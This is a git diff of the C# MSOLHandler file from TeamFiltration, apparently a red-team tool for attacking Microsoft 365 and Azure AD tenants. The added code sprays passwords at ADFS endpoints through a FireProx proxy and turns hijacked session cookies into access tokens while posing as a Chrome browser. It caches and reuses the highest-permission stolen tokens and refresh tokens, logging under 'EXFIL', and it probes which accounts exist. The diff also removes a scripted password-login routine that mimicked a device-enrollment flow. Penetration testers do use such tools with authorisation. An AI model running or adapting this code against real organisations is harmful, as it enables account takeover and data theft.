@@ -14,6 +14,8 @@ using TeamFiltration.Models.TeamFiltration;
 using TeamFiltration.Helpers;
 using static TeamFiltration.Modules.Spray;
 using System.Web;
+using System.IdentityModel.Tokens.Jwt;
+using System.Net.Http.Headers;
 
 namespace TeamFiltration.Handlers
 {
@@ -23,7 +25,7 @@ namespace TeamFiltration.Handlers
         public static string _moduleName { get; set; }
         public static bool _debugMode { get; set; }
         public static DatabaseHandler _databaseHandler { get; set; }
-        public MSOLHandler(GlobalArgumentsHandler globalProperties, string module, DatabaseHandler databaseHandler = null)
+        public MSOLHandler(GlobalArgumentsHandler globalProperties, string module, DatabaseHandler databaseHandler)
         {
             _globalProperties = globalProperties;
             _moduleName = module;
@@ -54,7 +56,8 @@ namespace TeamFiltration.Handlers
                     return true;
                 },
                 SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
-                UseProxy = _debugMode
+                UseProxy = _debugMode,
+                AllowAutoRedirect = userRealmResp.Adfs ? false : true
             };
             #endregion
 
@@ -105,7 +108,7 @@ namespace TeamFiltration.Handlers
 </s:Envelope>";
 
                 client.DefaultRequestHeaders.Add("User-Agent", _globalProperties.TeamFiltrationConfig.UserAgent);
-               
+
 
                 var xmlBody = new StringContent(xmlData, Encoding.UTF8, "text/xml");
                 HttpResponseMessage httpResp = await client.PostAsync(aadSsoUrl, xmlBody);
@@ -147,6 +150,8 @@ namespace TeamFiltration.Handlers
 
             if (userRealmResp.Adfs && !sprayAttempts.AADSSO)
             {
+                int retyRequest = 0;
+            adfsRetry:
                 var loginPostBody = new FormUrlEncodedContent(new[]
                   {
 
@@ -157,38 +162,77 @@ namespace TeamFiltration.Handlers
                 });
 
 
-                var adfsURL = new Uri(userRealmResp.ThirdPartyAuthUrl.Split("?")[0]);
 
-                //client.DefaultRequestHeaders.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,''image/webp,; q = 0.8'");
+
+                Uri adfsUrl = new Uri(sprayAttempts.FireProxURL);
+
+                string queryString = adfsUrl.Query;
+
                 client.DefaultRequestHeaders.Add("User-Agent", _globalProperties.TeamFiltrationConfig.UserAgent);
+                //client-request-id={Guid.NewGuid().ToString()}
 
-                var adfsUrl = $"https://{adfsURL.Host}/adfs/ls/?wfresh=0&wauth=http%3a%2f%2fschemas.microsoft.com%2fws%2f2008%2f06%2fidentity%2fauthenticationmethod%2fpassword&cxhflow=TB&cxhplatformversion=10.0.17763&client-request-id={Guid.NewGuid().ToString()}&username={HttpUtility.UrlEncode(sprayAttempts.Username)}&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline";
+                // Parse the query string into a dictionary of key-value pairs
+                var queryParams = HttpUtility.ParseQueryString(queryString);
 
-                HttpResponseMessage httpResp = await client.PostAsync(adfsUrl, loginPostBody);
+                // Update the "username" parameter with the given email address
+                queryParams.Set("username", sprayAttempts.Username);
+
+                UriBuilder builder = new UriBuilder(adfsUrl);
+                builder.Query = queryParams.ToString();
+
+
+                HttpResponseMessage httpResp = await client.PostAsync(builder.ToString(), loginPostBody);
                 string contentResp = await httpResp.Content.ReadAsStringAsync();
-                httpResp.Headers.TryGetValues("Set-Cookie", out var setCookies);
 
-                bool MSISAuth = setCookies.Where(x => x.Contains("MSISAuth=")).Any();
 
-                if (httpResp.StatusCode.Equals(HttpStatusCode.OK) && MSISAuth)
-                    tokenResp = new BearerTokenResp()
+                if (httpResp.IsSuccessStatusCode)
+                {
+                    Regex regex = new Regex(@"<div id=""error""[^>]*>\s*<span id=""errorText""[^>]*>\s*(.*?)\s*</span>\s*</div>");
+                    Match match = regex.Match(contentResp);
+
+                    if (match.Success)
                     {
-                        access_token = setCookies.Where(x => x.Contains("MSISAuth=")).FirstOrDefault().Split("=")[1],
-                        expires_on = "1337",
-                        ext_expires_in = "1337",
-                        expires_in = "1337",
-                        refresh_token = "",
-                        resource = adfsURL.Host
-                    };
+                        string errorMessage = match.Groups[1].Value;
+                        errorResp = new BearerTokenErrorResp()
+                        { error_description = errorMessage };
+                    }
+                    else
+                    {
+                        //Let's fake this so it's easy to return
+                        errorResp = new BearerTokenErrorResp()
+                        { error_description = "AADSTS50126: Invalid password or username", error = "AADSTS50126" };
+                    }
 
 
+                }
                 else
-                    errorResp = new BearerTokenErrorResp()
-                    { error_description = "ADF1337: Invalid password or username" };// JsonConvert.DeserializeObject<BearerTokenErrorResp>(contentResp);
+                {
+                    //We got a Succsessfull login
+                    httpResp.Headers.TryGetValues("Set-Cookie", out var setCookies);
+
+                    if (setCookies != null)
+                    {
+                        if (setCookies.Where(x => x.Contains("MSISAuth=")).Any())
+                            tokenResp = new BearerTokenResp()
+                            {
+                                access_token = setCookies.Where(x => x.Contains("MSISAuth=")).FirstOrDefault().Split("=")[1]
+                            };
+
+                    }
+                    else
+                    {
+                        if (httpResp.StatusCode == HttpStatusCode.GatewayTimeout && retyRequest < 3)
+                        {
+                            retyRequest++;
+                            goto adfsRetry;
+                        }
+
+                        errorResp = new BearerTokenErrorResp()
+                        { error_description = $"ADF1337: Uknown error response (HTTP STATUS: {httpResp.StatusCode})" };
+                    }
+                }
 
             }
-
-
             if (!userRealmResp.Adfs && !sprayAttempts.AADSSO)
             {
                 var loginPostBody = new FormUrlEncodedContent(new[]
@@ -219,8 +263,14 @@ namespace TeamFiltration.Handlers
             return (tokenResp, errorResp);
         }
 
-        public async Task<(BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError)> CookieGetAccessToken(string tenantId, string cookieData, string baseUrl = "https://login.microsoftonline.com", string targetResource = "https://legitcorpnet-my.sharepoint.com", string clientId = "5e3ce6c0-2b1f-4285-8d4b-75ee78787346")
+
+
+
+
+        public async Task<(BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError)> CookieGetAccessToken(string tenantId, string username,
+            string cookieData, string baseUrl = "https://login.microsoftonline.com", string targetResource = "https://legitcorpnet-my.sharepoint.com", string clientId = "5e3ce6c0-2b1f-4285-8d4b-75ee78787346", bool checkCache = true)
         {
+            //TODO: We need to find a way way way better way of doing this
             var proxy = new WebProxy
             {
                 Address = new Uri(_globalProperties.TeamFiltrationConfig.proxyEndpoint),
@@ -242,62 +292,112 @@ namespace TeamFiltration.Handlers
                 AllowAutoRedirect = false,
             };
 
+            BearerTokenResp tokenRespObject = null;
+            BearerTokenErrorResp errorResp = null;
+
+            if (checkCache)
+            {
+                //Get the username inside the access token
+                //string username = Helpers.Generic.GetUsername(bearer.access_token);
+
+                //Query all tokens for this given resource
+                List<PulledTokens> tokenQueryList = _databaseHandler.QueryToken(username, targetResource);
+
+                //Filter out the ones that are not valid 
+                IEnumerable<PulledTokens> validTokenQueryList = tokenQueryList.Where(x => Helpers.Generic.IsTokenValid(x.ResponseData, x.DateTime));
+
+                if (validTokenQueryList.Count() > 0)
+                {
+                    //Is the access token valid?
+                    var validAccessTokenQuery = validTokenQueryList.Where(x => Helpers.Generic.IsAccessTokenValid(x.ResponseData, x.DateTime));
+                    if (validAccessTokenQuery.Count() > 0)
+                    {
+                        //Get the access token with the most permissions
+                        var mostPermissionsKey = validAccessTokenQuery.OrderByDescending(x => ((BearerTokenResp)x).scope.Length).FirstOrDefault();
+
+                        var tokenObject = (BearerTokenResp)mostPermissionsKey;
 
 
-            using var client = new HttpClient(httpClientHandler);
+                        tokenRespObject = tokenObject;
+                        return (tokenRespObject, errorResp);
+                    }
 
-            client.DefaultRequestHeaders.Add("Cookie", cookieData);
-            client.DefaultRequestHeaders.Add("Accept", "application/json");
-            client.DefaultRequestHeaders.Add("User-Agent", _globalProperties.TeamFiltrationConfig.UserAgent);
+                }
+            }
 
-            var url = baseUrl + "/" + tenantId + "/oauth2/v2.0/authorize?response_type=token&grant_type=authorization_code&scope=" + "https://" + new Uri(targetResource).Host + "//.default openid profile&client_id=" + clientId + "&redirect_uri=https://teams.microsoft.com/go&client_info=1&claims={\"access_token\":{\"xms_cc\":{\"values\":[\"CP1\"]}}}&client-request-id=" + Guid.NewGuid().ToString() + "&windows_api_version=2.0";
-           
-            HttpResponseMessage httpResp = await client.GetAsync(url);
+
+            var client = new HttpClient(httpClientHandler);
+
+            var url = baseUrl + "/" + tenantId + "/oauth2/v2.0/authorize?response_type=token&scope=" + "https://" + new Uri(targetResource).Host + "//.default openid profile&client_id=" + clientId + "&redirect_uri=https://teams.microsoft.com/go&client_info=1&client-request-id=" + Guid.NewGuid().ToString() + "&windows_api_version=2.0";
+            var refreshCookieMsg = new HttpRequestMessage(HttpMethod.Get, url);
+            refreshCookieMsg.Headers.Add("Cookie", cookieData);
+            refreshCookieMsg.Headers.Add("Accept", "application/json");
+
+
+            //This must be a browser for Cookie-Single-Sign-on to work, thanks Microsoft...
+            refreshCookieMsg.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36");
+
+
+            HttpResponseMessage httpResp = await client.SendAsync(refreshCookieMsg);
             string contentResp = await httpResp.Content.ReadAsStringAsync();
 
-            BearerTokenResp tokenResp = null;
-            BearerTokenErrorResp errorResp = null;
+
 
             if (httpResp.StatusCode == HttpStatusCode.Redirect)
             {
+                Regex regex = new Regex(@"(access_token=ey[a-zA-Z0-9_=]+)\.([a-zA-Z0-9_=]+)\.([a-zA-Z0-9_\-\+\/=]*)");
 
-                Regex regex = new Regex(@"access_token=(.*)>here");
+                Match oauthAuthorizeConfig = regex.Match(contentResp);
 
-                Match oauthAuthroizeConfig = regex.Match(contentResp);
+                if (!oauthAuthorizeConfig.Success)
+                {
+                    Console.WriteLine("[!] Failed to extract access token from the response.");
+                    return (null, errorResp);
+                }
 
-                var accessTokenString = oauthAuthroizeConfig.Value;
+                var accessTokenString = oauthAuthorizeConfig.Value;
 
-                NameValueCollection qscoll = HttpUtility.ParseQueryString(HttpUtility.UrlDecode(accessTokenString));
+                var decodedAccessTokenString = HttpUtility.UrlDecode(accessTokenString);
+                var parsedAccessToken = HttpUtility.ParseQueryString(decodedAccessTokenString);
+                var accessToken = parsedAccessToken.Get("access_token");
 
-                Console.WriteLine($"[+] Successfully got access token for {Helpers.Generic.GetUsername(qscoll.GetValues("access_token")[0])}, target resource: {"https://" + new Uri(targetResource).Host}");
-
-
-                tokenResp = new BearerTokenResp()
+                try
                 {
 
-                    resource = "https://" + new Uri(targetResource).Host,
-                    access_token = qscoll.GetValues("access_token")[0],
-                    refresh_token = qscoll.GetValues("access_token")[0],
-                    scope = "https://" + new Uri(targetResource).Host + "//.default openid profile",
-                    expires_in = qscoll.GetValues("amp;expires_in")[0]
 
-                };
+                    JwtSecurityToken jwtToken = Helpers.Generic.GetJwtSecurityToken(accessToken);
+                    PulledTokens pulledtoken = Helpers.Generic.ParseSingleAccessToken(jwtToken);
 
-                //  _databaseHandler.WriteToken(newToken);
+                    tokenRespObject = (BearerTokenResp)pulledtoken;
 
-                var foo = contentResp;
+                    Console.WriteLine($"[+] Successfully retrieved an access token for User:{Helpers.Generic.GetUsername(tokenRespObject.access_token)} Resource:{tokenRespObject.resource} using Single-Sign-On");
+
+                    _databaseHandler.WriteToken(pulledtoken);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("[!] Failed to parse token, consider looking at the network traffic using Burp and --debug");
+                    return (null, errorResp);
+                }
             }
             else
                 errorResp = JsonConvert.DeserializeObject<BearerTokenErrorResp>(contentResp);
 
-            return (tokenResp, errorResp);
+            return (tokenRespObject, errorResp);
         }
 
-        public async Task<(BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError)> RefreshAttempt(BearerTokenResp bearer, string url, string resURI = "https://outlook.office365.com", string clientId = "1fec8e78-bce4-4aaf-ab1b-5451cc387264", bool checkCache = true, bool print = true)
+        public async Task<(BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError)> RefreshAttempt(
+
+        BearerTokenResp bearer,
+        string url,
+        string resURI = "https://outlook.office365.com",
+        string clientId = "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
+        bool checkCache = true,
+        bool print = true,
+        string userAgent = "",
+        string scope = "openid"
+        )
         {
-
-
-
             BearerTokenResp tokenResp = null;
             BearerTokenErrorResp errorResp = null;
 
@@ -305,21 +405,47 @@ namespace TeamFiltration.Handlers
             {
                 return (tokenResp, errorResp);
             }
+            PulledTokens foundRefreshCache = null;
+            BearerTokenResp originalbearer = bearer;
 
 
             //We wanna check if we already have a valid token for this resource
             if (checkCache)
             {
-                var username = Helpers.Generic.GetUsername(bearer.access_token);
-                var tokenQueryData = _databaseHandler.QueryTokens(username, resURI);
-                if (tokenQueryData != null)
+                //Get the username inside the access token
+                string username = Helpers.Generic.GetUsername(bearer.access_token);
+
+                //Query all tokens for this given resource
+                List<PulledTokens> tokenQueryList = _databaseHandler.QueryToken(username, resURI);
+
+                //Filter out the ones that are not valid 
+                IEnumerable<PulledTokens> validTokenQueryList = tokenQueryList.Where(x => Helpers.Generic.IsTokenValid(x.ResponseData, x.DateTime));
+
+                if (validTokenQueryList.Count() > 0)
                 {
-                    var tokenObject = JsonConvert.DeserializeObject<BearerTokenResp>(tokenQueryData.ResponseData);
-                    if (Helpers.Generic.IsTokenValid(tokenQueryData.ResponseData, tokenQueryData.DateTime))
+                    //Is the access token valid?
+                    var validAccessTokenQuery = validTokenQueryList.Where(x => Helpers.Generic.IsAccessTokenValid(x.ResponseData, x.DateTime));
+                    if (validAccessTokenQuery.Count() > 0)
                     {
+                        //Get the access token with the most permissions
+                        var mostPermissionsKey = validAccessTokenQuery.OrderByDescending(x => ((BearerTokenResp)x).scope.Length).FirstOrDefault();
+
+                        var tokenObject = (BearerTokenResp)mostPermissionsKey;
+
+                        if (print)
+                            _databaseHandler.WriteLog(new Log(_moduleName, $"Found valid access token in database for => {"https://" + new Uri(resURI).Host}"));
                         tokenResp = tokenObject;
                         return (tokenResp, errorResp);
                     }
+                    //If it's not the access token that is valid, it must be the refresh token
+                    //Get the refresh token with the most permissions
+                    PulledTokens mostPermissionsRefresh = validTokenQueryList.OrderByDescending(x => ((BearerTokenResp)x).scope.Length).FirstOrDefault();
+                    bearer = (BearerTokenResp)mostPermissionsRefresh;
+                    clientId = mostPermissionsRefresh.ResourceClientId;
+
+                    foundRefreshCache = mostPermissionsRefresh;
+                    if (print)
+                        _databaseHandler.WriteLog(new Log(_moduleName, $"Found valid refresh token in database for => {"https://" + new Uri(resURI).Host}"));
                 }
             }
             var proxy = new WebProxy
@@ -331,6 +457,9 @@ namespace TeamFiltration.Handlers
 
             };
 
+            //No point in attempting a refresh if we don't have a refresh token
+            if (string.IsNullOrEmpty(bearer.refresh_token))
+                return (tokenResp, errorResp);
 
             var httpClientHandler = new HttpClientHandler
             {
@@ -353,7 +482,7 @@ namespace TeamFiltration.Handlers
                 new KeyValuePair<string, string>("refresh_token", bearer.refresh_token),
                 new KeyValuePair<string, string>("client_id",  clientId),
                 new KeyValuePair<string, string>("resource", "https://" + new Uri(resURI).Host ),
-                new KeyValuePair<string, string>("scope", "openid"),
+                new KeyValuePair<string, string>("scope", scope),
                 new KeyValuePair<string, string>("windows_api_version", "2.0"),
                 new KeyValuePair<string, string>("claims", "{\"access_token\":{\"xms_cc\":{\"values\":[\"CP1\"]}}}"),
 
@@ -363,7 +492,7 @@ namespace TeamFiltration.Handlers
 
 
             client.DefaultRequestHeaders.Add("Accept", "application/json");
-            client.DefaultRequestHeaders.Add("User-Agent", _globalProperties.TeamFiltrationConfig.UserAgent);
+            client.DefaultRequestHeaders.Add("User-Agent", string.IsNullOrEmpty(userAgent) ? _globalProperties.TeamFiltrationConfig.UserAgent : userAgent);
 
             //Add some error handling here
             var httpResp = await client.PostAsync(url, loginPostBody);
@@ -373,8 +502,9 @@ namespace TeamFiltration.Handlers
             if (httpResp.IsSuccessStatusCode)
             {
                 if (print)
-                    _databaseHandler.WriteLog(new Log(_moduleName, $"Refreshed a token for => {"https://" + new Uri(resURI).Host }"));
+                    _databaseHandler.WriteLog(new Log(_moduleName, $"Refreshed a token for => {"https://" + new Uri(resURI).Host}"));
                 tokenResp = JsonConvert.DeserializeObject<BearerTokenResp>(contentResp);
+
                 _databaseHandler.WriteToken(new PulledTokens()
                 {
                     ResponseData = contentResp,
@@ -390,18 +520,38 @@ namespace TeamFiltration.Handlers
                 if (print)
                 {
                     if (string.IsNullOrEmpty(attempDecode?.error_description))
-                        _databaseHandler.WriteLog(new Log(_moduleName, $"Failed to get token for => {"https://" + new Uri(resURI).Host } HTTPStatusCode {httpResp.StatusCode}", ""));
+                        _databaseHandler.WriteLog(new Log(_moduleName, $"Failed to get token for => {"https://" + new Uri(resURI).Host} HTTPStatusCode {httpResp.StatusCode}"));
                     else
-                        _databaseHandler.WriteLog(new Log(_moduleName, $"Failed to get token for => {"https://" + new Uri(resURI).Host } AAD CODE: {attempDecode.error_description.Split(":")[0]}", ""));
+                        _databaseHandler.WriteLog(new Log(_moduleName, $"Failed to get token for => {"https://" + new Uri(resURI).Host} AAD CODE: {attempDecode.error_description.Split(":")[0]}"));
                 }
+
+                //check if token has invalid grant / expired
+                //Check if it failed
+                if (attempDecode != null && foundRefreshCache != null)
+                {
+                    //Check if the token has been revoked / invalid grant
+                    if (attempDecode.error.Equals("invalid_grant"))
+                        //If revoked, we have no need for it, remove it
+                        //TODO: Instead of removing, maybe mark as revoked? We might wanna keep for later
+                        if (_databaseHandler.DeleteToken(foundRefreshCache))
+                        {
+                            _databaseHandler.WriteLog(new Log("EXFIL", $"Removing revoked token for resource {foundRefreshCache.ResourceUri}", "") { }, true);
+                            //Attempt one more time but use the original bearer token
+                            await RefreshAttempt(originalbearer, url, resURI, clientId, false, true, userAgent);
+                        }
+                }
+
+
                 errorResp = JsonConvert.DeserializeObject<BearerTokenErrorResp>(contentResp);
             }
 
             return (tokenResp, errorResp);
         }
-   
-        public async Task<(BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError)> LoginAttemptFireProx(string username, string password, string url, (string Uri, string clientId) randomO365Res, bool print = true)
+
+        public async Task<(BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError)> LoginAttemptFireProx(string username, string password, string url, (string Uri, string clientId) randomO365Res, bool print = true, string userAgent = "")
         {
+            if (string.IsNullOrEmpty(userAgent))
+                userAgent = _globalProperties.TeamFiltrationConfig.UserAgent;
 
             var proxy = new WebProxy
             {
@@ -443,7 +593,7 @@ namespace TeamFiltration.Handlers
             });
 
             client.DefaultRequestHeaders.Add("Accept", "application/json");
-            client.DefaultRequestHeaders.Add("User-Agent", _globalProperties.TeamFiltrationConfig.UserAgent);
+            client.DefaultRequestHeaders.Add("User-Agent", userAgent);
 
 
             HttpResponseMessage httpResp = await client.PostAsync(url, loginPostBody);
@@ -475,7 +625,7 @@ namespace TeamFiltration.Handlers
             int redoCount = 0;
 
         Start:
-          
+
 
             var proxy = new WebProxy
             {
@@ -527,10 +677,8 @@ namespace TeamFiltration.Handlers
 
                     if (postRespObject.ThrottleStatus == 0)
                     {
-                        if (postRespObject.IfExistsResult == 0 || postRespObject.IfExistsResult == 5 || postRespObject.IfExistsResult == 6)
-
-                            if (!string.IsNullOrEmpty(postRespObject.EstsProperties?.CallMetadata?.HisRegion))
-                                return true;
+                        if (postRespObject.IfExistsResult == 0 && postRespObject.EstsProperties?.UserTenantBranding != null && postRespObject.EstsProperties.DomainType == 3)
+                            return true;
                     }
                     else
                     {
@@ -548,212 +696,7 @@ namespace TeamFiltration.Handlers
             return false;
 
         }
-       
-        public async Task<GetTokenResp> GetToken(string username, string password, string onBehalfUrl = "https://outlook.office365.com", bool print = false)
-        {
 
-            var baseUrl = "https://login.microsoftonline.com/";
-
-            // This is for debug , eg burp
-            var proxy = new WebProxy
-            {
-                Address = new Uri(_globalProperties.TeamFiltrationConfig.proxyEndpoint),
-                BypassProxyOnLocal = false,
-                UseDefaultCredentials = false,
-
-
-            };
-
-
-            var httpClientHandler = new HttpClientHandler
-            {
-                Proxy = proxy,
-                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
-                {
-
-                    return true;
-                },
-                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
-                UseProxy = _debugMode
-            };
-
-
-            var loginClient = new HttpClient(httpClientHandler);
-
-
-            //ClientId for Teams
-            //string clientId = "1fec8e78-bce4-4aaf-ab1b-5451cc387264";
-            //Outlook mobile
-            string clientId = "27922004-5251-4030-b22d-91ecd9a37ea4";
-
-
-            var queryParams = new NameValueCollection(){
-            { "response_type", "code" },
-            { "client_id", clientId },
-            { "redirect_uri", "ms-appx-web://Microsoft.AAD.BrokerPlugin/" + clientId },
-            { "add_account", "multiple" },
-            { "login_hint", username },
-            { "response_mode", "form_post" },
-            { "claims", "{\"access_token\":{\"xms_cc\":{\"values\":[\"CP1\"]}}}" },
-           // { "scope", "Mail.ReadBasic, Mail.Read, Mail.ReadWrite" },
-            { "resource", "https://" + new Uri(onBehalfUrl).Host},
-            { "windows_api_version", "2.0"},
-             };
-
-
-            var oAuthUrl_Authorize = baseUrl + "common/oauth2/authorize?" + Helpers.Generic.ToQueryString(queryParams);
-
-
-
-
-            loginClient.DefaultRequestHeaders.Add("return-client-request-id", "true");
-            loginClient.DefaultRequestHeaders.Add("client-request-id", Guid.NewGuid().ToString());
-            loginClient.DefaultRequestHeaders.Add("tb-aad-env-id", "10.0.17763.1131");
-            loginClient.DefaultRequestHeaders.Add("tb-aad-device-family", "3");
-            loginClient.DefaultRequestHeaders.Add("Origin", "https://login.microsoftonline.com");
-            loginClient.DefaultRequestHeaders.Add("Host", new Uri(baseUrl).Host);
-            loginClient.DefaultRequestHeaders.Add("User-Agent", _globalProperties.TeamFiltrationConfig.UserAgent);
-
-            //Send the GET req
-            HttpResponseMessage oAuthResp = await loginClient.PollyGetAsync(oAuthUrl_Authorize);
-
-            //Read the content
-            string oauthAuthroizeResponseContent = await oAuthResp.Content.ReadAsStringAsync();
-
-            if (oauthAuthroizeResponseContent.Contains("/adfs/ls/?"))
-            {
-                if (print)
-                    _databaseHandler.WriteLog(new Log(_moduleName, $"Seems like we are dealing with ADFS, not supported as of this time!", ""));
-
-            }
-            else if (oauthAuthroizeResponseContent.Contains("This web browser either does not support JavaScript"))
-            {
-                if (print)
-                    _databaseHandler.WriteLog(new Log(_moduleName, $"Something bad happend, does this account belong to an O365 tenant?!", ""));
-                // _teamFiltrationConfig.WriteLog("[+] Something bad happend, does this account belong to an O365 tenant?", _moduleName);
-
-            }
-            else
-            {
-
-
-                //Carve out some data we need
-                Regex regex = new Regex(@"\$Config={(.*)\};");
-
-                Match oauthAuthroizeConfig = regex.Match(oauthAuthroizeResponseContent);
-
-                GetAuthResponse getDataParsed = JsonConvert.DeserializeObject<GetAuthResponse>(oauthAuthroizeConfig.Groups[0].Value.Replace("$Config=", "").TrimEnd(';'));
-
-                IEnumerable<string> clientReqId = oAuthResp.Headers.GetValues("client-request-id");
-
-                string hpgRequestId = oAuthResp.Headers.GetValues("x-ms-request-id").FirstOrDefault();
-
-
-
-                var loginPostBody = new FormUrlEncodedContent(new[]
-                {
-                new KeyValuePair<string, string>("i13", "0"),
-                new KeyValuePair<string, string>("login", username),
-                new KeyValuePair<string, string>("loginfmt", username),
-                new KeyValuePair<string, string>("LoginOptions", "3"),
-                new KeyValuePair<string, string>("type", "11"),
-                new KeyValuePair<string, string>("passwd", password),
-                new KeyValuePair<string, string>("ps", "2"),
-                new KeyValuePair<string, string>("loginOptions", "3"),
-                new KeyValuePair<string, string>("NewUser", "1"),
-
-                //No idea what this is
-                new KeyValuePair<string, string>("fspost", "0"),
-                new KeyValuePair<string, string>("i21", "0"),
-                new KeyValuePair<string, string>("CookieDisclosure", "1"),
-                new KeyValuePair<string, string>("IsFidoSupported", "0"),
-                new KeyValuePair<string, string>("isSignupPost", "0"),
-                new KeyValuePair<string, string>("i19", "1685"),
-
-               new KeyValuePair<string, string>("canary", getDataParsed.canary),
-               new KeyValuePair<string, string>("ctx", getDataParsed.sCtx),
-               new KeyValuePair<string, string>("hpgrequestid", hpgRequestId),
-               new KeyValuePair<string, string>("flowToken", getDataParsed.sFT)
-
-            });
-
-
-                //Send the login request
-                HttpResponseMessage loginResp = await loginClient.PostAsync(baseUrl + "common/login?cxhflow=TB&cxhplatformversion=10.0.17763", loginPostBody);
-
-                //authMethodId
-                var rawResp = await loginResp.Content.ReadAsStringAsync();
-                Match loginRespReg = regex.Match(rawResp);
-
-                if (rawResp.Contains("authMethodId"))
-                {
-
-                    LoginMFAAuthResponse loginMFAAuthResponseData = JsonConvert.DeserializeObject<LoginMFAAuthResponse>(loginRespReg.Groups[0].Value.Replace("$Config=", "").TrimEnd(';'));
-
-
-                    return new GetTokenResp() { MFAResponse = loginMFAAuthResponseData, TokenResp = null };
-
-                }
-
-                //sErrorCode
-
-                if (rawResp.Contains("sErrorCode"))
-                {
-
-                    LoginErrorAuthResponse loginErrorAuthResponseData = JsonConvert.DeserializeObject<LoginErrorAuthResponse>(loginRespReg.Groups[0].Value.Replace("$Config=", "").TrimEnd(';'));
-
-
-                    return new GetTokenResp() { MFAResponse = null, TokenResp = null, ErrorResp = loginErrorAuthResponseData };
-
-                }
-                LoginAuthResponse loginAuthResponeData = JsonConvert.DeserializeObject<LoginAuthResponse>(loginRespReg.Groups[0].Value.Replace("$Config=", "").TrimEnd(';'));
-
-                //Get the latest ID from this "flow"
-                hpgRequestId = loginResp.Headers.GetValues("x-ms-request-id").FirstOrDefault();
-
-
-                //Need to carve out some header data to not inroll device
-                Regex inrollDeviceReg = new Regex(@"name=""code"" value=""(.*)"" />");
-
-                if (rawResp.Contains("Your account has been locked"))
-                {
-
-                    return null;
-                }
-
-                var inrollDeviceMatches = inrollDeviceReg.Match(rawResp);
-
-                if (inrollDeviceMatches.Groups[0].Length == 0)
-                {
-
-                    return null;
-                }
-
-                var inrollDeviceCode = inrollDeviceMatches.Groups[0].Value.Replace("name=\"code\" value=\"", "").Split(new String[] { "/><input" }, StringSplitOptions.RemoveEmptyEntries)[0].Replace("\"", "");
-
-                var bearerContent = new FormUrlEncodedContent(new[]
-             {
-
-                new KeyValuePair<string, string>("grant_type", "authorization_code"),
-                new KeyValuePair<string, string>("redirect_uri", "ms-appx-web://Microsoft.AAD.BrokerPlugin/" + clientId),
-                new KeyValuePair<string, string>("code", inrollDeviceCode),
-                new KeyValuePair<string, string>("client_id", clientId),
-                new KeyValuePair<string, string>("claims", "{\"access_token\":{\"xms_cc\":{\"values\":[\"CP1\"]}}}"),
-                new KeyValuePair<string, string>("windows_api_version", "2.0"),
-
-                //This is some sort of magic ass value, have NO idea where it's generated or what it is. needs to be looked into and hopefully generated dynamicly
-                new KeyValuePair<string, string>("tbidv2", "AAEGAQC39BpxT9ud1GdBZ//NUmSqwYkiu+A+awkfGjw6XQzREm6nvdiYMJVShq8FAz1fRWPqsl0oAsS2kgg9+oeWuv/Ic0ESvjUs07A7IFBBgeiPCb2jaStEFPa2xDKXWB1l8xHIpcenmf1eR9eQ6St/NxxspulsWiLJc8BmCnGOrc0ClkALZ/vPNBrvKtsdWopdIKI8F/lAhunw1mQ1PZXFjqAyI9yERvww/JsN6h9LgUp8TcQXkYBCD+0eZlFCTICh4Wir9NOG4v8CbjTjNhqOSy68f3u3M5LdcJVxYdKVwFcU1quRLiPgX9xAWnMjNiOvmNGwsCIHiXxuWYL5mnjrrxCxAwEAAQ==")
-
-            });
-
-
-                HttpResponseMessage bearerTokenResp = await loginClient.PostAsync(baseUrl, bearerContent);
-                BearerTokenResp bearerTokenRespData = JsonConvert.DeserializeObject<BearerTokenResp>(await bearerTokenResp.Content.ReadAsStringAsync());
-                return new GetTokenResp() { MFAResponse = null, TokenResp = bearerTokenRespData };
-                // return bearerTokenRespData;
-            }
-            return new GetTokenResp() { MFAResponse = null, TokenResp = null };
-        }
 
     }
 }
